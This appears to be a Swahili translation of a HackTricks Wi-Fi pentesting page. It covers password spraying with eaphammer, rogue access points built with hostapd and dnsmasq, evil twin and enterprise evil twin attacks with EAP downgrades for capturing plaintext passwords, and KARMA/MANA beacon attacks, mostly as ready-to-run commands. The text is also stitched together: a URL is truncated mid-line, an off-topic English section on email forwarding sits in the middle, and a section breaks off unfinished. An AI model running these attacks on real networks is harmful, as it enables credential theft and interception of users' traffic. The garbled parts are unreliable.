- Katika hali hii, watumiaji wote hutumia "anonimasi" kama kitambulisho chao cha mtumiaji. Seva ya RADIUS ya awali inafanya kazi kama seva ya EAP-PEAP au EAP-TTLS, inayowajibika kwa kusimamia upande wa seva wa itifaki ya PEAP au TTLS. Njia ya ndani (iliyolindwa) ya uthibitisho basi inashughulikiwa kwa ndani au inapelekwa kwa seva ya RADIUS ya mbali (nyumbani).

* EAP-Kitambulisho = anonimasi@enzi_x

- Katika hali hii, watumiaji kutoka enzi tofauti wanaficha kitambulisho chao wakati wakionyesha enzi zao husika. Hii inaruhusu seva ya RADIUS ya awali kupeleka maombi ya EAP-PEAP au EAP-TTLS kwa seva za RADIUS katika enzi zao za nyumbani, ambazo hufanya kama seva ya PEAP au TTLS. Seva ya RADIUS ya awali inafanya kazi kama kifaa cha kuhamisha RADIUS tu.

- Vinginevyo, seva ya RADIUS ya awali inaweza kufanya kazi kama seva ya EAP-PEAP au EAP-TTLS na kushughulikia njia ya uthibitisho iliyolindwa au kupeleka kwa seva nyingine. Chaguo hili linawezesha usanidi wa sera tofauti kwa enzi mbalimbali.

Katika EAP-PEAP, mara tu handaki ya TLS inakamilishwa kati ya seva ya PEAP na mteja wa PEAP, seva ya PEAP inaanzisha ombi la EAP-Kitambulisho na kuituma kupitia handaki ya TLS. Mteja anajibu ombi la EAP-Kitambulisho la pili kwa kutuma jibu la EAP-Kitambulisho lenye kitambulisho halisi cha mtumiaji kupitia handaki iliyofichwa. Hii inazuia kufichua kitambulisho halisi cha mtumiaji kwa yeyote anayesikiliza trafiki ya 802.11.

EAP-TTLS inafuata utaratibu kidogo tofauti. Kwa EAP-TTLS, mteja kawaida huthibitisha kwa kutumia PAP au CHAP, iliyolindwa na handaki ya TLS. Katika kesi hii, mteja analeta sifa ya Jina la Mtumiaji na sifa ya Nenosiri au CHAP-Nenosiri katika ujumbe wa TLS wa awali uliotumwa baada ya kuanzisha handaki.

Bila kujali itifaki iliyochaguliwa, seva ya PEAP/TTLS inapata ufahamu wa kitambulisho halisi cha mtumiaji baada ya handaki ya TLS kuanzishwa. Kitambulisho halisi cha mtumiaji kinaweza kuwakilishwa kama mtumiaji@enzi au tu mtumiaji. Ikiwa seva ya PEAP/TTLS pia inawajibika kwa kuthibitisha mtumiaji, sasa inamiliki kitambulisho cha mtumiaji na kuendelea na njia ya uthibitisho iliyolindwa na handaki ya TLS. Vinginevyo, seva ya PEAP/TTLS inaweza kupeleka ombi jipya la RADIUS kwa seva ya RADIUS ya nyumbani ya mtumiaji. Ombi jipya la RADIUS hili linapuuza safu ya itifaki ya PEAP au TTLS. Katika kesi ambapo njia ya uthibitisho iliyolindwa ni EAP, ujumbe wa ndani wa EAP unatumwa kwa seva ya RADIUS ya nyumbani bila kifuniko cha EAP-PEAP au EAP-TTLS. Sifa ya Jina la Mtumiaji ya ujumbe wa RADIUS unaoondoka ina kitambulisho halisi cha mtumiaji, ikichukua nafasi ya Jina la Mtumiaji la anonimasi kutoka kwa ombi la RADIUS linaloingia. Wakati njia ya uthibitisho iliyolindwa ni PAP au CHAP (inayoungwa mkono tu na TTLS), Sifa ya Jina la Mtumiaji na sifa zingine za uthibitisho zilizochukuliwa kutoka kwa mzigo wa TLS zinabadilishwa katika ujumbe wa RADIUS unaoondoka, zikichukua nafasi ya Jina la Mtumiaji la anonimasi na sifa ya TTLS EAP-Ujumbe zilizopatikana katika ombi la RADIUS linaloingia.

Kwa habari zaidi angalia [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Unaweza pia kufanya shambulio hili kwa kutumia `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Nadharia za Mashambulizi ya Wateja

### Uchaguzi wa Mtandao na Roaming

- Itifaki ya 802.11 inaelezea jinsi kituo kinavyoungana na Huduma Iliyozidishwa ya Huduma (ESS) lakini haijaspecifisha vigezo vya kuchagua ESS au kufikia kipengele cha kufikia (AP) ndani yake.
- Vituo vinaweza kusafiri kati ya APs zinazoshiriki ESSID moja, kudumisha uunganisho katika jengo au eneo.
- Itifaki inahitaji kituo kujithibitisha kwa ESS lakini haiamuru AP kujithibitisha kwa kituo.

### Orodha za Mtandao Uliopendwa (PNLs)

- Vituo huhifadhi ESSID ya kila mtandao wa wireless wanapounganisha kwenye Orodha yao ya Mtandao Uliopendwa (PNL), pamoja na maelezo maalum ya usanidi wa mtandao.
- PNL hutumiwa kuunganisha moja kwa moja kwenye mtandao uliojulikana, kuboresha uzoefu wa mtumiaji kwa kusawazisha mchakato wa kuunganisha.

### Uchunguzi wa Kusikiliza

- APs hutoa mara kwa mara fremu za bendera, zikionyesha uwepo wao na huduma, pamoja na ESSID ya AP isipokuwa utangazaji umezimwa.
- Wakati wa uchunguzi wa kusikiliza, vituo hulisikiliza fremu za bendera. Ikiwa ESSID ya bendera inalingana na kuingia kwenye PNL ya kituo, kituo kinaweza kuunganisha moja kwa moja kwenye AP hiyo.
- Ujuzi wa PNL ya kifaa unaruhusu uwezekano wa kutumia kwa kufanana na ESSID ya mtandao uliojulikana, kuwadanganya vifaa kuunganisha kwenye AP bandia.

### Uchunguzi wa Moja kwa Moja

- Uchunguzi wa moja kwa moja unahusisha vituo kutuma ombi la uchunguzi ili kugundua APs karibu na sifa zao.
- Ombi la uchunguzi lililolengwa linalenga ESSID maalum, kusaidia kugundua ikiwa mtandao fulani uko ndani ya umbali, hata ikiwa ni mtandao uliofichwa.
- Ombi la uchunguzi la utangazaji lina uga wa SSID tupu na hutumwa kwa APs zote karibu, kuruhusu kituo kuchunguza mtandao wowote uliopendwa bila kufichua maudhui ya PNL yake.

## AP Rahisi na Uelekezaji kwa Mtandao

Kabla ya kuelezea jinsi ya kufanya mashambulizi yenye utata zaidi, tutaelezea tu jinsi ya **kuunda** AP na **kuuelekeza** trafiki yake kwenye kiolesura kilichounganishwa **na** Mtandao **wa** **Internet**.

Kwa kutumia `ifconfig -a` angalia kwamba kiolesura cha wlan cha kuunda AP na kiolesura kilichounganishwa na Mtandao wa Internet vipo.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Tengeneza faili ya config `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Kisha **weka IPs** na **njia**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Na kisha **anza** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd

hostapd ni programu ya Linux ambayo inaruhusu kifaa kuwa kituo cha upatikanaji wa Wi-Fi. Inaweza kutumika katika mazingira ya uchunguzi wa usalama wa mtandao ili kujenga mtandao wa Wi-Fi bandia na kuchunguza shughuli za watumiaji.

Kwa kuanzisha hostapd, unaweza kudhibiti vigezo vya mtandao wa Wi-Fi, kama vile jina la mtandao (SSID), njia ya usalama (WPA, WPA2), na ufunguo wa usalama. Pia inaruhusu kudhibiti idadi ya watumiaji wanaoruhusiwa kuungana na mtandao na kufuatilia shughuli zao.

Kwa kutumia hostapd, unaweza kutekeleza mbinu za uchunguzi wa usalama wa Wi-Fi, kama vile kuvuta nywila za Wi-Fi, kufuatilia shughuli za watumiaji, na kugundua mashambulizi ya kudukua mtandao. Ni chombo muhimu katika mchakato wa uchunguzi wa usalama wa Wi-Fi.
```bash
apt-get install hostapd
```
Tengeneza faili ya usanidi `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Acha michakato inayosumbua**, weka **hali ya ufuatiliaji**, na **anza hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Kuelekeza na Kuhamisha Mbele

Forwarding and redirection are techniques used in networking to redirect traffic from one location to another. These techniques are commonly used in the context of pentesting WiFi networks.

#### Port Forwarding

Port forwarding involves redirecting network traffic from one IP address and port number to another IP address and port number. This technique is often used to expose a service running on a local network to the internet. By configuring port forwarding on a router or firewall, incoming traffic can be directed to a specific device on the local network.

#### DNS Redirection

DNS redirection involves manipulating the Domain Name System (DNS) to redirect traffic from one domain to another. This technique can be used to redirect users to a malicious website or to intercept and modify network traffic. By modifying the DNS records, an attacker can redirect traffic intended for a legitimate website to their own server.

#### URL Redirection

URL redirection involves redirecting a user from one URL to another. This technique is commonly used to redirect users from an old website to a new one or to redirect users to a specific page within a website. URL redirection can be achieved through server-side redirects or client-side redirects using JavaScript.

#### Email Forwarding

Email forwarding involves automatically redirecting incoming emails from one email address to another. This technique is often used to consolidate multiple email accounts into a single inbox or to forward emails to a different email provider. By configuring email forwarding rules, users can automatically redirect emails based on specific criteria.

#### Conclusion

Forwarding and redirection techniques are powerful tools in networking and can be used for various purposes, including pentesting WiFi networks. It is important to understand these techniques and their potential implications in order to effectively secure network infrastructure.
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Kaka Mwovu

Shambulio la kaka mwovu linatumia njia ambayo wateja wa WiFi wanatambua mitandao, hasa kutegemea jina la mtandao (ESSID) bila kuhitaji kituo cha msingi (kituo cha kupata) kujithibitisha kwa mteja. Mambo muhimu ni:

- **Ugumu wa Kutofautisha**: Vifaa vinashindwa kutofautisha kati ya vituo vya kupata halali na vya kughushi wakati vinashiriki ESSID sawa na aina sawa ya kusimbwa. Mitandao halisi ya ulimwengu mara nyingi hutumia vituo vingi vya kupata na ESSID sawa ili kuongeza chanjo kwa urahisi.

- **Roaming ya Mteja na Udanganyifu wa Uunganisho**: Itifaki ya 802.11 inaruhusu vifaa kuhamia kati ya vituo vya kupata ndani ya ESS moja. Wadukuzi wanaweza kutumia hili kwa kumshawishi kifaa kujitenga na kituo chake cha msingi cha sasa na kuunganisha na kile cha kughushi. Hii inaweza kufanikiwa kwa kutoa ishara yenye nguvu zaidi au kuvuruga uhusiano na kituo halali cha kupata kupitia njia kama pakiti za kujiondoa au kuvuruga.

- **Changamoto katika Utekelezaji**: Kutekeleza shambulio la kaka mwovu kwa mazingira yenye vituo vingi vya kupata vilivyowekwa vizuri kunaweza kuwa changamoto. Kujiondoa kwa kituo halali kimoja cha kupata mara nyingi husababisha kifaa kuunganisha na kituo kingine halali isipokuwa muharibifu anaweza kujiondoa kwa vituo vyote vya kupata vilivyoko karibu au kuweka kwa ustadi kituo cha kughushi.

Unaweza kuunda Kaka Mwovu wa Aina ya Wazi sana (haina uwezo wa kusambaza trafiki kwenye mtandao) kwa kufanya:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Unaweza pia kuunda Evil Twin kwa kutumia **eaphammer** (tambua kwamba ili kuunda evil twins na eaphammer, kiolesura **HAIFAI KUWA** katika hali ya **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Au kutumia Airgeddon: `Chaguo: 5,6,7,8,9 (ndani ya menyu ya shambulio la Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Tafadhali kumbuka kwamba kwa chaguo-msingi ikiwa ESSID katika PNL imehifadhiwa kama iliyolindwa na WPA, kifaa hakitaji kuunganisha moja kwa moja na Evil Twin wazi. Unaweza kujaribu kufanya DoS kwa AP halisi na matumaini kwamba mtumiaji ataunganisha kwa mkono kwenye Evil Twin wazi yako, au unaweza kufanya DoS kwa AP halisi na kutumia WPA Evil Twin ili kukamata handshake (kwa kutumia njia hii hautaweza kuruhusu muathirika kuunganisha na wewe kwa sababu haujui PSK, lakini unaweza kukamata handshake na kujaribu kuiharibu).

_Baadhi ya OS na AV zitamjulisha mtumiaji kuwa kuunganisha kwenye mtandao wazi ni hatari..._

### WPA/WPA2 Evil Twin

Unaweza kuunda **Evil Twin kwa kutumia WPA/2** na ikiwa vifaa vimehifadhiwa kuunganisha na SSID hiyo na WPA/2, watajaribu kuunganisha. Hata hivyo, **ili kukamilisha 4-way-handshake** unahitaji pia **kujua** **nenosiri** ambalo mteja atatumia. Ikiwa **hulijui**, **unganisho halitakamilika**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Ili kuelewa mashambulizi haya, ningependekeza kusoma maelezo mafupi ya [ufafanuzi wa WPA Enterprise](./#wpa-enterprise-mgt) kwanza.

**Kutumia hostapd-wpe**

`hostapd-wpe` inahitaji faili ya **configuration** ili kufanya kazi. Ili **kuautomatisha** uundaji wa mazingira haya, unaweza kutumia [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (pakua faili ya python ndani ya _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Katika faili ya usanidi unaweza kuchagua mambo mengi tofauti kama ssid, channel, faili za mtumiaji, cret/key, dh parameters, wpa version na auth...

[**Kutumia hostapd-wpe na EAP-TLS kuruhusu cheti chochote kuingia.**](evil-twin-eap-tls.md)

**Kutumia EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Kwa chaguo-msingi, EAPHammer hutumia njia hizi za uwakiki (tambua GTC kama ya kwanza kujaribu kupata nywila za maandishi wazi na kisha tumia njia za uwakiki imara zaidi):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Hii ni njia ya msingi ya kuepuka muda mrefu wa kuunganisha. Hata hivyo, unaweza pia kuweka mbinu za uthibitishaji kwa server kutoka dhaifu hadi imara zaidi:
```
--negotiate weakest
```
Au unaweza kutumia:

* `--negotiate gtc-downgrade` ili kutumia utekelezaji wa GTC downgrade wenye ufanisi mkubwa (nywila za maandishi wazi)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` ili kubainisha kwa mkono njia zinazotolewa (kutoa njia sawa za uthibitishaji kwa mpangilio sawa kama shirika hilo litakuwa vigumu zaidi kugundua shambulio).
* [Pata habari zaidi katika wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Kutumia Airgeddon**

`Airgeddon` inaweza kutumia vyeti vilivyotengenezwa hapo awali ili kutoa uthibitishaji wa EAP kwa mitandao ya WPA/WPA2-Enterprise. Mtandao bandia utapunguza itifaki ya uunganisho hadi EAP-MD5 ili kuweza **kukamata mtumiaji na MD5 ya nywila**. Baadaye, mshambuliaji anaweza kujaribu kuvunja nywila.\
`Airggedon` inakupa uwezekano wa shambulio la **Evil Twin linaloendelea (kelele)** au **kuunda shambulio la Evil Twin mpaka mtu anapojiunganisha (laini).**

![](<../../.gitbook/assets/image (129).png>)

### Kurekebisha makosa katika mitandao ya PEAP na EAP-TTLS TLS katika shambulio la Evil Twin

_Mbinu hii ilijaribiwa katika uunganisho wa PEAP lakini kwa kuwa ninadondoa kituo cha TLS cha kiholela, hii pia inafanya kazi na EAP-TTLS_

Ndani ya **usanidi** wa _hostapd-wpe_ **komenti** mstari unaotaja _**dh\_file**_ (kutoka `dh_file=/etc/hostapd-wpe/certs/dh` hadi `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Hii itafanya `hostapd-wpe` kubadilishana funguo kwa kutumia RSA badala ya DH, hivyo utaweza **kudondoa** trafiki baadaye **ukijua funguo binafsi za seva**.

Sasa anzisha **Evil Twin** kwa kutumia **`hostapd-wpe`** na usanidi uliobadilishwa kama kawaida. Pia, anzisha **`wireshark`** kwenye **kiolesura** kinachotekeleza shambulio la Evil Twin.

Sasa au baadaye (unapokuwa tayari umekamata baadhi ya nia za uthibitishaji) unaweza kuongeza funguo binafsi za RSA kwa wireshark katika: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Ongeza kuingia mpya na jaza fomu na thamani hizi: **Anwani ya IP = yoyote** -- **Bandari = 0** -- **Itifaki = data** -- **Faili la Funguo** (**chagua faili lako la funguo**, ili kuepuka matatizo chagua faili la funguo **bila ulinzi wa nywila**).

![](<../../.gitbook/assets/image (151).png>)

Naangalia kwenye kichupo kipya cha **"Decrypted TLS"**:

![](<../../.gitbook/assets/image (152).png>)

## KARMA, MANA, Loud MANA na shambulio la Beacons linalojulikana

### Orodha nyeusi/nyeupe ya ESSID na MAC

Aina tofauti za Orodha za Kudhibiti Upatikanaji wa Udhibiti wa Vyombo vya Habari (MFACLs) na hali zao zinazolingana na athari kwenye tabia ya Kituo cha Kupatikana kwa Njia ya Rogue (AP):

1. **Orodha nyeupe kulingana na MAC**:
- Kituo cha Rogue AP kitajibu tu kwa maombi ya uchunguzi kutoka kwa vifaa vilivyoorodheshwa kwenye orodha nyeupe, kikiendelea kuwa siri kwa wengine ambao hawajatajwa.

2. **Orodha nyeusi kulingana na MAC**:
- Kituo cha Rogue AP kitapuuza maombi ya uchunguzi kutoka kwa vifaa vilivyoorodheshwa kwenye orodha nyeusi, kwa hiyo kituo cha Rogue AP kitakuwa siri kwa vifaa maalum hivyo.

3. **Orodha nyeupe kulingana na ESSID**:
- Kituo cha Rogue AP kitajibu maombi ya uchunguzi tu kwa ESSIDs maalum yaliyoorodheshwa, kikiwa siri kwa vifaa ambavyo Orodha zao za Mtandao Uliopendwa (PNLs) hazijumuishi ESSIDs hizo.

4. **Orodha nyeusi kulingana na ESSID**:
- Kituo cha Rogue AP hakitajibu maombi ya uchunguzi kwa ESSIDs maalum yaliyoorodheshwa kwenye orodha nyeusi, kikiwa siri kwa vifaa vinavyotafuta mitandao hiyo maalum.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Mbinu hii inaruhusu **mshambuliaji kuunda kipengele cha upatikanaji (AP) cha kudhuru ambacho kinajibu maombi yote ya uchunguzi kutoka kwa vifaa vinavyotafuta kuunganisha kwenye mitandao**. Mbinu hii **inawadanganya vifaa kuunganisha kwenye AP ya mshambuliaji** kwa kufanana na mitandao ambayo vifaa vinatafuta. Mara tu kifaa kinapowasilisha ombi la kuunganisha kwenye AP hii bandia, inakamilisha uhusiano, na kusababisha kifaa kuunganisha kimakosa kwenye mtandao wa mshambuliaji.

### MANA

Kisha, **vifaa vikaanza kupuuza majibu yasiyotarajiwa ya mtandao**, kupunguza ufanisi wa shambulio la karma asili. Hata hivyo, mbinu mpya, inayojulikana kama **shambulio la MANA**, ililetwa na Ian de Villiers na Dominic White. Mbinu hii inahusisha AP bandia **kukamata Orodha za Mtandao Ulio Pendwa (PNL) kutoka kwa vifaa kwa kujibu maombi yao ya uchunguzi wa matangazo** na majina ya mitandao (SSIDs) ambayo hapo awali yalitafutwa na vifaa. Shambulio hili la kisasa linapita kinga dhidi ya shambulio la karma asili kwa kuchexploit njia ambayo vifaa vinakumbuka na kipaumbeleza mitandao inayojulikana.

Shambulio la MANA linafanya kazi kwa kufuatilia maombi ya uchunguzi yanayoelekezwa na matangazo kutoka kwa vifaa. Kwa maombi yaliyoelekezwa, inarekodi anwani ya MAC ya kifaa na jina la mtandao lililoulizwa, na kuongeza habari hii kwenye orodha. Wakati ombi la matangazo linapokelewa, AP inajibu na habari inayolingana na mitandao yoyote kwenye orodha ya kifaa, kuchochea kifaa kuunganisha kwenye AP bandia.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Shambulizi la MANA Kwa Kishindo

**Shambulizi la MANA Kwa Kishindo** ni mkakati wa juu unapotumika vifaa havitumii uchunguzi ulioelekezwa au wakati Orodha ya Mtandao Inayopendelewa (PNL) haijulikani kwa mshambuliaji. Inafanya kazi kwa msingi kwamba **vifaa katika eneo moja huenda wakashiriki majina ya mtandao fulani katika PNL zao**. Badala ya kujibu kwa kuchagua, shambulizi hili linatangaza majibu ya uchunguzi kwa kila jina la mtandao (ESSID) lililopatikana katika PNL zilizounganishwa za vifaa vyote vilivyosomewa. Njia hii pana inaongeza nafasi ya kifaa kutambua mtandao unaofahamika na kujaribu kuunganisha kwenye Kituo cha Kupata (AP) cha udanganyifu.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Shambulizi la Ishara Inayojulikana ya Beacon

Wakati shambulizi la **Loud MANA** halitoshi, shambulizi la **Ishara Inayojulikana ya Beacon** linatoa njia nyingine. Njia hii **inatumia nguvu kubwa kwenye mchakato wa kuunganisha kwa kusimuliza AP ambayo inajibu kwa jina lolote la mtandao, kwa kuzunguka kupitia orodha ya ESSIDs inayowezekana** iliyopatikana kutoka kwenye orodha ya maneno. Hii inasimuliza uwepo wa mitandao mingi, kwa matumaini ya kupata ESSID ndani ya PNL ya mwathirika, na kusababisha jaribio la kuunganisha kwenye AP bandia. Shambulizi linaweza kuongezwa nguvu kwa kuliunganisha na chaguo la `--loud` ili kujaribu kuvutia vifaa kwa nguvu zaidi.

Eaphammer imeutekeleza shambulizi hili kama shambulizi la MANA ambapo ESSIDs zote ndani ya orodha zinachajiwa (unaweza pia kuliongeza na `--loud` ili kuunda shambulizi la Loud MANA + Ishara Inayojulikana ya Beacon):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Shambulio la Mlipuko wa Ishara Inayojulikana**

**Shambulio la Mlipuko wa Ishara Inayojulikana** linahusisha **matangazo ya haraka ya fremu za ishara kwa kila ESSID iliyoorodheshwa katika faili**. Hii inaunda mazingira yenye msongamano wa mitandao bandia, ikiongeza sana uwezekano wa vifaa kuunganisha kwenye AP bandia, haswa wakati inachanganywa na shambulio la MANA. Mbinu hii inatumia kasi na wingi ili kuzidi nguvu za vifaa za kuchagua mtandao.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** ni itifaki inayowezesha vifaa kuunganishwa moja kwa moja kwa kutumia Wi-Fi bila hitaji la kufikia kwa njia ya kawaida ya ufikiaji wa wireless. Uwezo huu umewekwa katika vifaa mbalimbali vya Internet of Things (IoT), kama vile printers na televisheni, kurahisisha mawasiliano moja kwa moja kati ya vifaa. Sifa muhimu ya Wi-Fi Direct ni kwamba kifaa kimoja kinachukua jukumu la kufikia, kinachojulikana kama mmiliki wa kikundi, ili kusimamia uhusiano.

Usalama kwa ajili ya uhusiano wa Wi-Fi Direct unawekwa kupitia **Wi-Fi Protected Setup (WPS)**, ambayo inasaidia njia kadhaa za kujumuisha kwa usalama, ikiwa ni pamoja na:
- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Njia hizi, hasa PIN entry, zina hatari sawa na WPS katika mitandao ya Wi-Fi ya kawaida, hivyo kuwa malengo ya njia za mashambulizi sawa.

### EvilDirect Hijacking

**EvilDirect Hijacking** ni shambulio maalum kwa Wi-Fi Direct. Inafanana na wazo la shambulio la Evil Twin lakini inalenga uhusiano wa Wi-Fi Direct. Katika hali hii, mshambuliaji anajifanya kuwa mmiliki halali wa kikundi na lengo la kuwadanganya vifaa kuunganisha na kifaa cha uovu. Njia hii inaweza kutekelezwa kwa kutumia zana kama vile `airbase-ng` kwa kutoa maelezo ya channel, ESSID, na anwani ya MAC ya kifaa kinachojifanya:

## Marejeo

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Angalia [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login na facebook na kuiga WPA kwenye captive portals)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa bug bounty!

**Machapisho Kuhusu Udukuzi**\
Shiriki na maudhui yanayochunguza msisimko na changamoto za udukuzi

**Habari za Udukuzi za Waktu Halisi**\
Kuwa na habari za hivi karibuni katika ulimwengu wa udukuzi kupitia habari na ufahamu wa wakati halisi

**Matangazo ya Hivi Karibuni**\
Endelea kuwa na habari kuhusu bug bounties mpya zinazozinduliwa na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **na anza kushirikiana na wadukuzi bora leo!**

<details>

<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) **na** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos.**

</details>
